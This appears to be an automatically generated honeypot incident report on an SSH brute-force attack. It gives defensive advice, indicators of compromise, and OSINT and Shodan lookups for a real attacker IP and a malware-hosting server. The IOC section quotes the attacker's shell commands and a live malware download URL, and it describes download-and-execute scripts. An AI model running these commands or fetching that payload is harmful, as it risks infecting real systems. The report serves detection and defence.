1. **Weak or Default Credentials:** If the system has weak or easily guessable passwords, or if it uses default credentials that the attacker can exploit, then the brute force or credential stuffing attempts could be successful, granting the attacker initial access.

2. **Unpatched Software:** If the system has unpatched software, especially within services exposed to the network, like SSH, it could be susceptible to remote code execution or privilege escalation exploits that the attacker could use to gain elevated privileges.

3. **Lack of File Execution Controls:** If the system allows files to be executed from any location, especially from writable directories like `/tmp`, the attacker's downloaded files could be executed without restriction.

4. **Insufficient Process Monitoring:** Without adequate monitoring or protection of critical processes, the attacker's efforts to kill processes designed to evade defenses would likely go unnoticed.

5. **Lack of Network Segmentation and Controls:** If the system is part of a network without proper segmentation or controls, it would allow for lateral movement once the attacker gains access to one system.

6. **Disabled or Ineffective Security Solutions:** If security solutions such as firewalls, intrusion detection/prevention systems, or anti-malware are not in place, disabled, not updated, or ineffective, the attacker's malicious activity may not be identified or blocked.

7. **Lack of Outbound Communication Controls:** If the system allows unauthorized outbound communication, it would enable the malware to communicate with command and control servers and possibly exfiltrate data.

However, even if the system is vulnerable in some areas, strong security measures in other areas could mitigate the attack. For example, effective monitoring could detect unusual activity, and incident response procedures could isolate and address the compromised system before significant damage is done.

To reduce the risk and impact of this type of attack, it is important to implement multiple layers of defense-in-depth strategies. Regularly patching software, enforcing strong password policies, implementing security solutions and network segmentation, and continuously monitoring systems can help prevent successful attacks or limit their impact.

# How Can A System Be Protected From This Attack?
To protect a system from this kind of attack, a combination of preventive measures, detection mechanisms, and response strategies should be deployed. This multi-layered approach, often referred to as defense-in-depth, can greatly enhance the security of a system. Here are some measures to consider:

### Preventive Measures:
1. **Strong Authentication Controls:**
   - Implement strong password policies.
   - Use multi-factor authentication (MFA) where possible.
   - Regularly rotate credentials and use unique passwords for different services.

2. **Regular Updates and Patch Management:**
   - Keep the operating system and all software up-to-date with the latest patches.
   - Proactively monitor for new vulnerabilities and apply security updates promptly.

3. **Least Privilege Principle:**
   - Limit user and process privileges; users and services should only have the minimum privileges necessary to perform their tasks.
   - Disable unnecessary services or features to reduce the attack surface.

4. **Firewalls and Network Segmentation:**
   - Use firewalls to restrict inbound and outbound traffic to only what is necessary for business operations.
   - Implement network segmentation to limit lateral movement within the network.

5. **Host-Based Security Solutions:**
   - Deploy antivirus and anti-malware solutions, ensuring they are kept updated with the latest definitions.
   - Use application whitelisting to prevent unauthorized applications from executing on the system.

6. **File System Permissions and Controls:**
   - Restrict execution of binaries, especially in directories like `/tmp`.
   - Implement file system permissions carefully, avoiding overly permissive settings (e.g., avoiding `chmod 777`).

### Detection Measures:
1. **Intrusion Detection Systems (IDS):**
   - Employ network-based and host-based IDS to detect and alert on suspicious activities.

2. **Logging and Monitoring:**
   - Enable comprehensive logging of security-relevant events (e.g., failed login attempts, new process creation).
   - Regularly monitor logs for suspicious activities, using automated tools when possible.

3. **Anomaly Detection:**
   - Implement behavioral-based detection systems to identify deviations from normal baseline activity.

### Response Strategies:
1. **Incident Response Plan:**
   - Develop and maintain an incident response plan tailored to different types of cyber threats.
   - Regularly test and update the incident response plan to ensure effectiveness.

2. **Isolation and Remediation:**
   - Have processes in place to quickly isolate compromised systems to prevent the spread of an attack.
   - Prepare a remediation process for removing malware, restoring systems, and recovering data from backups.

By implementing a combination of these measures, a system's vulnerability to the types of attacks observed can be significantly reduced, and the system's ability to withstand potential security breaches can be strengthened. It is also important to foster a culture of security awareness among users, as human factors often play a critical role in the security of information systems.

# What Are The Indicators Of Compromise (Iocs) For This Attack?
Indicators of Compromise (IOCs) are pieces of forensic data that can be used to identify potentially malicious activities. For this particular attack, the following IOCs can help identify similar attacks:

1. **IP Addresses and URLs:**
   - Source IP Address: `204.76.203.13`
   - Malicious URL: `http://94.156.68.152/ah`
   - Multiple download attempts from a suspicious server IP: `94.156.68.152`

2. **Malware Hashes:**
   - SHA256: `fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054` for the binary downloading script.
   - SHA256: `199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8` for the 'senpai' text marker.

3. **Malicious Commands and Scripts:**
   - `enable`, `system`, `shell`, `sh`, `linuxshell`
   - `cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai`
   - Commands to download and execute a file with various methods including `wget`, `curl`, `tftp`, and to remove it afterward.
   - Script to iterate over different processor architectures and attempt to fetch respective binaries.

4. **Files and Directories:**
   - Presence of unexpected files in `/tmp` or other writable directories with names such as `ah` or `vh`.
   - Files or text placeholders with content such as 'senpai'.

5. **Suspicious System Activity:**
   - Unexpected processes being killed, especially those involving deletion markers in `/proc/[0-9]*/maps`.
   - Changes in file permissions to make files executable by any user (e.g., use of `chmod 777`).

6. **Anomalous Network Activity:**
   - Unusual outgoing network traffic to `94.156.68.152` or similar untrusted IP addresses.
   - Multiple failed SSH login attempts which may indicate a brute force attack.

7. **Logs and Audit Trails:**
   - Log entries for the commands executed by the attacker.
   - System or security logs indicating access from known malicious IP addresses.
   - Logs showing the execution of unrecognized or suspicious binaries.

These IOCs can be utilized to scan and monitor systems for malicious activities that resemble this attack, allowing for rapid detection and response to potential threats. It is important to regularly update IOCs as attackers may change their tactics, techniques, and procedures (TTPs) over time.

# What do you know about the attacker?
After reviewing data from all the queried OSINT sources, here are the critical findings about the IP address involved in the attack and associated malware:

### Attacker IP: `204.76.203.13`
- **Location:** Saint Kitts and Nevis.
- **Network:** Intelligence Hosting LLC, potentially indicating a server rental or VPS used for the attack.
- **Reports:**
  - Recognized for scanning and malicious activities in the last 3 months (GreyNoise).
  - High risk by MetaDefender, known for brute force and scanning activities.
  - On multiple blocklists, indicating widespread recognition of its malicious activities (IPdata.co).
  - High number of reports suggesting malicious use, with 1354 reports from 646 users on AbuseIPDB.
  - Tagged on threat and feed lists for SSH Brute Force, denoting SSH service exploitation (Pulsedive).
  - ISC details two reports involving this IP targeting honeypots.
  - Associated with numerous attacks according to BlackList DE and noted in IPsum and EU Botnets/Zombies/Scanners lists (Offline Feeds).

### Malware Samples:
- **Hashes:**
  - `fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054`
  - `199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8`
- **Details:**
  - MalwareBazaar and ThreatFox did not return any specific details on these hashes.
  - A URL was extracted from one of the malware samples (`http://94.156.68.152`); however, URLhaus did not provide further details about this URL.

### Other IPs and Hosts:
- **Host Located in Malware:** `94.156.68.152` with no additional location information from OSINT sources.

### Overall Summary:
The critical OSINT findings paint a picture of an IP address (`204.76.203.13`) associated with high-risk activities, including scanning and brute force attacks, especially targeting SSH services. The IP has a heavy presence on blocklists and feed lists, indicating its involvement in various cyber attacks. The malware hashes related to this IP do not currently have additional intel available in the databases searched. However, a URL hosted on the IP `94.156.68.152` was found within one of the malware samples. This could potentially be linked to further malicious activities such as command and control communications or distribution of additional payloads.

Continued monitoring and analysis of the IP and any associated samples, as well as efforts to identify any new intelligence or activities, will be paramount for maintaining situational awareness and defensive postures against similar attacks.

<details>
<summary>
<h2>IP Locations</h2>
</summary>


### IP Locations Summary
Based on the available OSINT information, here is a summary of the location-related details for the IP address associated with the attack:

- **Attacker IP:** `204.76.203.13`
  - **Geolocation:** Saint Kitts and Nevis
  - **Network Provider:** Intelligence Hosting LLC
  - **Usage Classification:** Data Center/Web Hosting/Transit
  - **Associated with ASN Name:** INTELLIGENCE-ATOM-HOSTING

The IP address is reported to be from a network that is likely a hosting provider, suggesting that the IP may be associated with a rented server or a virtual private server used for malicious activities.

Additionally, one of the hosts found in the malware, `94.156.68.152`, does not have detailed location information from the provided OSINT sources. Further investigation would be needed to determine the geographic location and network details of this IP address.

* This attack involved `2` unique IP addresses. `1` were source IPs.`1` unique IPs and `1` unique URLS were found in the commands.`1` unique IPs and `1` unique URLS were found in malware.
* The most common **Country** of origin was `Netherlands`, which was seen `1` times.
* The most common **City** of origin was `Amsterdam`, which was seen `1` times.
* The most common **ISP** of origin was `Limenet`, which was seen `1` times.
* The most common **Organization** of origin was `Neterra Ltd.`, which was seen `1` times.
* The most common **ASN** of origin was `AS394711`, which was seen `1` times.
* The most common **network** of origin was `204.76.203.0/24`, which was seen `1` times.


| IP Address | Country | City | ISP | Organization | ASN | Network |
| --- | --- | --- | --- | --- | --- | --- |
| 94.156.68.152 | Netherlands | Amsterdam | Limenet | Neterra Ltd. | AS394711 | 94.156.68.0/24 |

</details>

---


<details>
<summary>
<h2>CyberGordon</h2>
</summary>


### CyberGordon Results Summary
Using data from CyberGordon, we have the following information about the IP address involved in the attack:

- **Attacker IP:** `204.76.203.13`
- **Reports and Listings:**
  - GreyNoise: Reported on 03 December 2023 as malicious and scanning the internet in the last 3 months.
  - MetaDefender: Found in 3 sources as high risk with behavior such as brute force and scanning.
  - IPdata.co: Identified the geolocation as Saint Kitts and Nevis with network unknown, and highlighted risks associated with malicious/attacker activity and abuse/bot activity. It is also on several blocklists.
  - AbuseIPDB: The IP is under Intelligence Hosting LLC, used for Data Center/Web Hosting/Transit, with a risk score of 100%. It has 1354 reports from 646 users, with the last report on 04 December 2023.
  - Pulsedive: Marked with a medium risk and last seen on 29 November 2023. It is found on threat lists and feed lists for SSH Brute Force and is known for having open services, particularly SSH.
  - DShield/ISC: Reported in 2 reports targeting 1 target, last on 3 Dec 2023.
  - BlackList DE: Involved in 133 attacks and 3 reports.
  - Offline Feeds: Listed for IPsum blocklist data and noted as part of EU Botnets/Zombies/Scanners.

CyberGordon's data summary indicates that the IP is widely known for malicious activities, which include scanning, brute forcing, and other kinds of attacker activities. It has been frequently reported as a high-risk IP and is featured on multiple blocklists and threat feeds. Based on the consistent reporting across a variety of these sources and services, the IP is recognized for its association with harmful actions.

* `22` total alerts were found across all engines.
* `6` were **high** priority. 
* `9` were **medium** priority. 
* `7` were **low** priority. 
* The IP address with the **most high priority alerts** was `204.76.203.13` with `4` alerts.


| IP Addresss | Alerts High \| Med \| Low | [E1] IPinfo | [E2] AbuseIPDB | [E4] urlscan.io | [E7] Google DNS | [E11] DShield/ISC | [E12] AlienVault OTX | [E17] Pulsedive | [E19] ThreatMiner | [E23] Offline Feeds | [E24] BlackList DE | [E26] MetaDefender | [E33] GreyNoise | [E34] IPdata.co |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 204.76.203.13 | `4` \| `4` \| `3` | <details>`Geo: New York City, New York, US. Network: AS400328 Intelligence Hosting LLC. `<summary>`low`</summary></details> | <details>` ISP: Intelligence Hosting LLC. Usage: Data Center/Web Hosting/Transit. Risk 100%. 1354 report(s) by 646 user(s), last on 04 December 2023  `<summary>`high`</summary></details> | None | <details>`No DNS PTR record found `<summary>`low`</summary></details> | <details>`Found in 2 report(s) listing 1 target(s), last on 3 Dec 2023 `<summary>`medium`</summary></details> | None | <details>`Risk: medium. Last seen on 29 Nov 2023. Found in threat list(s): SSH Brute Force. Found in feed list(s): Blocklist.de Blocklist, Dictionary SSH Attacks, Brute Force Hosts. Opened service(s): SSH. `<summary>`medium`</summary></details> | <details>`Engine request error,Engine request error,Engine request error `<summary>`low`</summary></details> | <details>`Found in IPsum (3+ blocklists), Duggy Tuxy - EU Botnets/Zombies/Scanners `<summary>`medium`</summary></details> | <details>`Found in 133 attack(s) and 3 report(s) `<summary>`medium`</summary></details> | <details>`Found in 3 sources: webroot.com (high risk), dataplane.org (bruteforce, scanner), blocklist.de (scanner) `<summary>`high`</summary></details> | <details>`Last report on 03 December 2023 as malicious and scanning the Internet in the last 3 months. `<summary>`high`</summary></details> | <details>`Geo: Saint Kitts and Nevis. Network: unknown. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Anti-attacks.com, Blocklist.de, Blocklist.net.ua, Charles Haley, DataPlane.org, GreenSnow, Interserver.net, isx.fr, James Brine, LiquidBinary, Megumin.ru, Rutgers, Scriptz Team, USTC.edu.cn. `<summary>`high`</summary></details> |
| 94.156.68.152 | `2` \| `5` \| `4` | <details>`Geo: Amsterdam, North Holland, NL. Network: AS394711 Limenet. `<summary>`low`</summary></details> | <details>` ISP: LIMENET. Usage: Data Center/Web Hosting/Transit. Risk 4%. 3 report(s) by 1 user(s), last on 30 November 2023  `<summary>`medium`</summary></details> | <details>`Found in 10 scan(s). Reported in urlhaus feed(s). Top 5 domains: 94.156.68.152 (10) `<summary>`medium`</summary></details> | <details>`No DNS PTR record found `<summary>`low`</summary></details> | <details>`Found in 478 report(s) listing 34 target(s), last on 3 Dec 2023 `<summary>`high`</summary></details> | <details>`Found in 7 pulse-feed(s) `<summary>`medium`</summary></details> | <details>`Risk: unknown. Last seen on 1 Dec 2023. `<summary>`low`</summary></details> | <details>`Engine request error,Engine request error,Engine request error `<summary>`low`</summary></details> | <details>`Found in DigitalSide (last 7 days) `<summary>`medium`</summary></details> | None | <details>`Found in 2 sources: webroot.com (high risk), avira.com (Malware) `<summary>`medium`</summary></details> | None | <details>`Geo: Karlovo, Plovdiv, Bulgaria. Network: AS394711, Limenet, business. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Abuse.ch, DigitalSide. `<summary>`high`</summary></details> |

### CyberGordon Results

<details>
<summary>
<h3>Cybergordon results for: 204.76.203.13</h3>
</summary>


### Cybergordon results for: 204.76.203.13 [https://cybergordon.com/r/3e4c927e-1a1f-4848-baa1-2e1f12cfce28](https://cybergordon.com/r/3e4c927e-1a1f-4848-baa1-2e1f12cfce28)

| Engine | Results | Url |
| --- | --- | --- |
| [E33] GreyNoise | Last report on 03 December 2023 as malicious and scanning the Internet in the last 3 months.  | https://viz.greynoise.io/ip/204.76.203.13 |
| [E26] MetaDefender | Found in 3 sources: webroot.com (high risk), dataplane.org (bruteforce, scanner), blocklist.de (scanner)  | https://metadefender.opswat.com |
| [E34] IPdata.co | Geo: Saint Kitts and Nevis. Network: unknown. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Anti-attacks.com, Blocklist.de, Blocklist.net.ua, Charles Haley, DataPlane.org, GreenSnow, Interserver.net, isx.fr, James Brine, LiquidBinary, Megumin.ru, Rutgers, Scriptz Team, USTC.edu.cn.  | https://ipdata.co |
| [E2] AbuseIPDB |  ISP: Intelligence Hosting LLC. Usage: Data Center/Web Hosting/Transit. Risk 100%. 1354 report(s) by 646 user(s), last on 04 December 2023   | https://www.abuseipdb.com/check/204.76.203.13 |
| [E17] Pulsedive | Risk: medium. Last seen on 29 Nov 2023. Found in threat list(s): SSH Brute Force. Found in feed list(s): Blocklist.de Blocklist, Dictionary SSH Attacks, Brute Force Hosts. Opened service(s): SSH.  | https://pulsedive.com/browse |
| [E11] DShield/ISC | Found in 2 report(s) listing 1 target(s), last on 3 Dec 2023  | https://isc.sans.edu/ipinfo.html?ip=204.76.203.13 |
| [E24] BlackList DE | Found in 133 attack(s) and 3 report(s)  | https://www.blocklist.de/en/search.html?ip=204.76.203.13 |
| [E23] Offline Feeds | Found in IPsum (3+ blocklists), Duggy Tuxy - EU Botnets/Zombies/Scanners  | / |
| [E7] Google DNS | No DNS PTR record found  | https://dns.google/query?name=13.203.76.204.in-addr.arpa&type=PTR |
| [E1] IPinfo | Geo: New York City, New York, US. Network: AS400328 Intelligence Hosting LLC.  | https://ipinfo.io/204.76.203.13 |
| [E19] ThreatMiner | Engine request error,Engine request error,Engine request error  | https://www.threatminer.org/host.php?q=204.76.203.13 |

</details>

---


<details>
<summary>
<h3>Cybergordon results for: 94.156.68.152</h3>
</summary>


### Cybergordon results for: 94.156.68.152 [https://cybergordon.com/r/9279ae7a-0cff-458d-8351-82fe5c679f8d](https://cybergordon.com/r/9279ae7a-0cff-458d-8351-82fe5c679f8d)

| Engine | Results | Url |
| --- | --- | --- |
| [E11] DShield/ISC | Found in 478 report(s) listing 34 target(s), last on 3 Dec 2023  | https://isc.sans.edu/ipinfo.html?ip=94.156.68.152 |
| [E34] IPdata.co | Geo: Karlovo, Plovdiv, Bulgaria. Network: AS394711, Limenet, business. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Abuse.ch, DigitalSide.  | https://ipdata.co |
| [E2] AbuseIPDB |  ISP: LIMENET. Usage: Data Center/Web Hosting/Transit. Risk 4%. 3 report(s) by 1 user(s), last on 30 November 2023   | https://www.abuseipdb.com/check/94.156.68.152 |
| [E26] MetaDefender | Found in 2 sources: webroot.com (high risk), avira.com (Malware)  | https://metadefender.opswat.com |
| [E4] urlscan.io | Found in 10 scan(s). Reported in urlhaus feed(s). Top 5 domains: 94.156.68.152 (10)  | https://urlscan.io/search/#ip%3A%2294.156.68.152%22 |
| [E23] Offline Feeds | Found in DigitalSide (last 7 days)  | / |
| [E12] AlienVault OTX | Found in 7 pulse-feed(s)  | https://otx.alienvault.com/indicator/ip/94.156.68.152 |
| [E7] Google DNS | No DNS PTR record found  | https://dns.google/query?name=152.68.156.94.in-addr.arpa&type=PTR |
| [E19] ThreatMiner | Engine request error,Engine request error,Engine request error  | https://www.threatminer.org/host.php?q=94.156.68.152 |
| [E17] Pulsedive | Risk: unknown. Last seen on 1 Dec 2023.  | https://pulsedive.com/browse |
| [E1] IPinfo | Geo: Amsterdam, North Holland, NL. Network: AS394711 Limenet.  | https://ipinfo.io/94.156.68.152 |

</details>

---


</details>

---


<details>
<summary>
<h2>Shodan</h2>
</summary>


### Shodan Results Summary
The information retrieved from the Shodan database on the attacker IP `204.76.203.13` returned a "404: Not Found" error, indicating that no data could be found or that the IP address may not be indexed in Shodan’s database at the time of the query.

Therefore, there is no available data from Shodan regarding open ports, running services, or any additional details that might have been provided through such a search. To gather more information about the involved IP address using Shodan, it may be necessary to conduct a manual search at a different time, or to use alternative sources in addition to Shodan to cross-reference any information.

- The most common **open port** was `21`, which was seen `1` times.
- The most common **protocol** was `tcp`, which was seen `3` times.
- The most common **service name** was `unknown`, which was seen `1` times.
- The most common **service signature** was `220 (vsFTPd 3.0.2)230 Login successful.214-The following commands are recognized. ABOR ACCT ALLO APPE CDUP CWD  DELE EPRT EPSV FEAT HELP LIST MDTM MKD MODE NLST NOOP OPTS PASS PASV PORT PWD  QUIT REIN REST RETR RMD  RNFR RNTO SITE SIZE SMNT STAT STOR STOU STRU SYST TYPE USER XCUP XCWD XMKD XPWD XRMD214 Help OK.`, which was seen `1` times.
- The most common **Country** was `Netherlands`, which was seen `1` times.
- The most common **City** was `Amsterdam`, which was seen `1` times.
- The most common **Organization** was `Neterra Ltd.`, which was seen `1` times.
- The most common **ISP** was `Limenet`, which was seen `1` times.
- The most common **ASN** was `AS394711`, which was seen `1` times.
- The IP address with the **most open ports** was `94.156.68.152` with `3` open ports.

| IP Addresss | # Open Ports | 21 | 22 | 80 |
| --- | --- | --- | --- | --- |
| 94.156.68.152 | <details>`21`, `22`, `80`<summary>`3`</summary></details> | unknown | OpenSSH7.4 | Apache httpd2.4.6 |

<details>
<summary>
<h4>Top 3 Open Ports</h4>
</summary>

Total Open Ports: `3`
Unique: `3`

| Open Port | Times Seen |
| --- | --- |
| `21` | `1` |
| `22` | `1` |
| `80` | `1` |

</details>

---




<details>
<summary>
<h4>Top 1 Protocols</h4>
</summary>

Total Protocols: `3`
Unique: `1`

| Protocol | Times Seen |
| --- | --- |
| `tcp` | `3` |

</details>

---




<details>
<summary>
<h4>Top 3 Service Names</h4>
</summary>

Total Service Names: `3`
Unique: `3`

| Service Name | Times Seen |
| --- | --- |
| `unknown` | `1` |
| `OpenSSH7.4` | `1` |
| `Apache httpd2.4.6` | `1` |

</details>

---




<details>
<summary>
<h4>Top 3 Service Signatures</h4>
</summary>

Total Service Signatures: `3`
Unique: `3`

| Service Signature | Times Seen |
| --- | --- |
| `220 (vsFTPd 3.0.2)230 Login successful.214-The following commands are recognized. ABOR ACCT ALLO APPE CDUP CWD  DELE EPRT EPSV FEAT HELP LIST MDTM MKD MODE NLST NOOP OPTS PASS PASV PORT PWD  QUIT REIN REST RETR RMD  RNFR RNTO SITE SIZE SMNT STAT STOR STOU STRU SYST TYPE USER XCUP XCWD XMKD XPWD XRMD214 Help OK.` | `1` |
| `SSH-2.0-OpenSSH_7.4` | `1` |
| `HTTP/1.1 403 Forbidden` | `1` |

</details>

---




<details>
<summary>
<h4>Top 1 Countrys</h4>
</summary>

Total Countrys: `1`
Unique: `1`

| Country | Times Seen |
| --- | --- |
| `Netherlands` | `1` |

</details>

---




<details>
<summary>
<h4>Top 1 Citys</h4>
</summary>

Total Citys: `1`
Unique: `1`

| City | Times Seen |
| --- | --- |
| `Amsterdam` | `1` |

</details>

---




<details>
<summary>
<h4>Top 1 Organizations</h4>
</summary>

Total Organizations: `1`
Unique: `1`

| Organization | Times Seen |
| --- | --- |
| `Neterra Ltd.` | `1` |

</details>

---




<details>
<summary>
<h4>Top 1 ISPs</h4>
</summary>

Total ISPs: `1`
Unique: `1`

| ISP | Times Seen |
| --- | --- |
| `Limenet` | `1` |

</details>

---




<details>
<summary>
<h4>Top 1 ASNs</h4>
</summary>

Total ASNs: `1`
Unique: `1`

| ASN | Times Seen |
| --- | --- |
| `AS394711` | `1` |

</details>

---


### Shodan Results

<details>
<summary>
<h3>Shodan results for: 94.156.68.152</h3>
</summary>


### Shodan results for: 94.156.68.152 [https://www.shodan.io/host/94.156.68.152](https://www.shodan.io/host/94.156.68.152)

| Country | City | Organization | ISP | ASN |
| --- | --- | --- | --- | --- |
| Netherlands | Amsterdam | Neterra Ltd. | Limenet | AS394711 |

#### Open Ports

| Port | Protocol | Service | Update Time |
| --- | --- | --- | --- |
| 21 | tcp | unknown | 2023-11-28T19:49:02.405733 |
| 22 | tcp | OpenSSH7.4 | 2023-12-02T17:34:27.796499 |
| 80 | tcp | Apache httpd2.4.6 | 2023-11-27T20:17:54.123017 |

#### Port 21 (tcp): unknown

<details>
<summary>
<h4>Raw Service Data for Port 21 (tcp): unknown</h4>
</summary>


```
220 (vsFTPd 3.0.2)
230 Login successful.
214-The following commands are recognized.
 ABOR ACCT ALLO APPE CDUP CWD  DELE EPRT EPSV FEAT HELP LIST MDTM MKD
 MODE NLST NOOP OPTS PASS PASV PORT PWD  QUIT REIN REST RETR RMD  RNFR
 RNTO SITE SIZE SMNT STAT STOR STOU STRU SYST TYPE USER XCUP XCWD XMKD
 XPWD XRMD
214 Help OK.
211-Features:
 EPRT
 EPSV
 MDTM
 PASV
 REST STREAM
 SIZE
 TVFS
 UTF8
211 End
```

</details>

---


| Key | Value |
| --- | --- |
| sig | 220 (vsFTPd 3.0.2)230 Login successful.214-The following commands are recognized. ABOR ACCT ALLO APPE CDUP CWD  DELE EPRT EPSV FEAT HELP LIST MDTM MKD MODE NLST NOOP OPTS PASS PASV PORT PWD  QUIT REIN REST RETR RMD  RNFR RNTO SITE SIZE SMNT STAT STOR STOU STRU SYST TYPE USER XCUP XCWD XMKD XPWD XRMD214 Help OK. |
| 211-Features | [' ', 'E', 'P', 'R', 'T', ' ', 'E', 'P', 'S', 'V', ' ', 'M', 'D', 'T', 'M', ' ', 'P', 'A', 'S', 'V', ' ', 'R', 'E', 'S', 'T', ' ', 'S', 'T', 'R', 'E', 'A', 'M', ' ', 'S', 'I', 'Z', 'E', ' ', 'T', 'V', 'F', 'S', ' ', 'U', 'T', 'F', '8', '2', '1', '1', ' ', 'E', 'n', 'd'] |

#### Port 22 (tcp): OpenSSH7.4

<details>
<summary>
<h4>Raw Service Data for Port 22 (tcp): OpenSSH7.4</h4>
</summary>


```
SSH-2.0-OpenSSH_7.4
Key type: ssh-rsa
Key: AAAAB3NzaC1yc2EAAAADAQABAAABAQDVk706hyNKKMIyTiyljpCLDlZvP2WZMboioRwJlIY3BhOE
1CFBb3lqGRfc+MAge40tnshk40YqtyHTSU4gNDB2J0r0SspA1916fJMjaGHjz/SUeiU/gRem1xs1
vTfI5B4Ngmy7FWyIB30c6WjI3M8LSogEVGuF8MFgXc6cB8Idtqzj18la1ONYQhT4dzTmlJgxRons
om75mv0bTp5IMNCv3gPGKtC8jlDC0B0yU4aqNspEy6WxGBGg7oBt6ukLM3qWb5HFFl0FRkQ1j0By
0CQ2hcoONFVs3Hilrrlhg0N3ukXiTWRSrvYNlDHnQ996dHLpuBIwAwtplUaCvB+Qqmaf
Fingerprint: 23:5b:20:48:1b:8c:9f:38:94:a3:33:58:2e:62:68:7b

Kex Algorithms:
	curve25519-sha256
	curve25519-sha256@libssh.org
	ecdh-sha2-nistp256
	ecdh-sha2-nistp384
	ecdh-sha2-nistp521
	diffie-hellman-group-exchange-sha256
	diffie-hellman-group16-sha512
	diffie-hellman-group18-sha512
	diffie-hellman-group-exchange-sha1
	diffie-hellman-group14-sha256
	diffie-hellman-group14-sha1
	diffie-hellman-group1-sha1

Server Host Key Algorithms:
	ssh-rsa
	rsa-sha2-512
	rsa-sha2-256
	ecdsa-sha2-nistp256
	ssh-ed25519

Encryption Algorithms:
	chacha20-poly1305@openssh.com
	aes128-ctr
	aes192-ctr
	aes256-ctr
	aes128-gcm@openssh.com
	aes256-gcm@openssh.com
	aes128-cbc
	aes192-cbc
	aes256-cbc
	blowfish-cbc
	cast128-cbc
	3des-cbc

MAC Algorithms:
	umac-64-etm@openssh.com
	umac-128-etm@openssh.com
	hmac-sha2-256-etm@openssh.com
	hmac-sha2-512-etm@openssh.com
	hmac-sha1-etm@openssh.com
	umac-64@openssh.com
	umac-128@openssh.com
	hmac-sha2-256
	hmac-sha2-512
	hmac-sha1

Compression Algorithms:
	none
	zlib@openssh.com
```

</details>

---


| Key | Value |
| --- | --- |
| sig | SSH-2.0-OpenSSH_7.4 |
| Key type | ssh-rsa |
| Key | AAAAB3NzaC1yc2EAAAADAQABAAABAQDVk706hyNKKMIyTiyljpCLDlZvP2WZMboioRwJlIY3BhOE1CFBb3lqGRfc+MAge40tnshk40YqtyHTSU4gNDB2J0r0SspA1916fJMjaGHjz/SUeiU/gRem1xs1vTfI5B4Ngmy7FWyIB30c6WjI3M8LSogEVGuF8MFgXc6cB8Idtqzj18la1ONYQhT4dzTmlJgxRonsom75mv0bTp5IMNCv3gPGKtC8jlDC0B0yU4aqNspEy6WxGBGg7oBt6ukLM3qWb5HFFl0FRkQ1j0By0CQ2hcoONFVs3Hilrrlhg0N3ukXiTWRSrvYNlDHnQ996dHLpuBIwAwtplUaCvB+Qqmaf |
| Fingerprint | 23:5b:20:48:1b:8c:9f:38:94:a3:33:58:2e:62:68:7b |
| Kex Algorithms | ['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group-exchange-sha1', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1', 'diffie-hellman-group1-sha1'] |
| Server Host Key Algorithms | ['ssh-rsa', 'rsa-sha2-512', 'rsa-sha2-256', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] |
| Encryption Algorithms | ['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com', 'aes128-cbc', 'aes192-cbc', 'aes256-cbc', 'blowfish-cbc', 'cast128-cbc', '3des-cbc'] |
| MAC Algorithms | ['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] |
| Compression Algorithms | ['none', 'zlib@openssh.com'] |

#### Port 80 (tcp): Apache httpd2.4.6

<details>
<summary>
<h4>Raw Service Data for Port 80 (tcp): Apache httpd2.4.6</h4>
</summary>


```
HTTP/1.1 403 Forbidden
Date: Mon, 27 Nov 2023 20:17:54 GMT
Server: Apache/2.4.6 (CentOS)
Last-Modified: Thu, 16 Oct 2014 13:20:58 GMT
ETag: "1321-5058a1e728280"
Accept-Ranges: bytes
Content-Length: 4897
Content-Type: text/html; charset=UTF-8
```

</details>

---


| Key | Value |
| --- | --- |
| sig | HTTP/1.1 403 Forbidden |
| Date | Mon, 27 Nov 2023 20:17:54 GMT |
| Server | Apache/2.4.6 (CentOS) |
| Last-Modified | Thu, 16 Oct 2014 13:20:58 GMT |
| ETag | "1321-5058a1e728280" |
| Accept-Ranges | bytes |
| Content-Length | 4897 |
| Content-Type | text/html; charset=UTF-8 |

</details>

---


</details>

---


<details>
<summary>
<h2>ThreatFox</h2>
</summary>


### ThreatFox Results Summary
The data related to the IP addresses involved in the attack retrieved from ThreatFox does not provide any specific details concerning the observed attack-related activity. Neither of the malware samples associated with the attacker IP has corresponding entries in the ThreatFox database:

- **Malware Hashes:**
  - `fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054`
  - `199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8`

Both hashes returned empty results from ThreatFox, meaning there is currently no available intelligence from this source about the malware samples used in the attack.

Therefore, based on the available data from ThreatFox, there is no information or reported activity related to these specific malware samples or the attacker's IP address.

</details>

---


<details>
<summary>
<h2>Internet Storm Center (ISC)</h2>
</summary>


### Internet Storm Center (ISC) [https://isc.sans.edu/ipinfo/](https://isc.sans.edu/ipinfo/)
Using data from the Internet Storm Center (ISC), the following is known about the IP address involved in the attack:

- **Attacker IP:** `204.76.203.13`
  - **Total Reports to ISC:** There have been 2 reports involving this IP address.
  - **Honeypots Targeted:** This IP has targeted 1 honeypot, according to ISC data.
  - **AS Name:** The IP is associated with INTELLIGENCE-ATOM-HOSTING.
  - **Country Code:** The AS country code is KN, corresponding to Saint Kitts and Nevis.
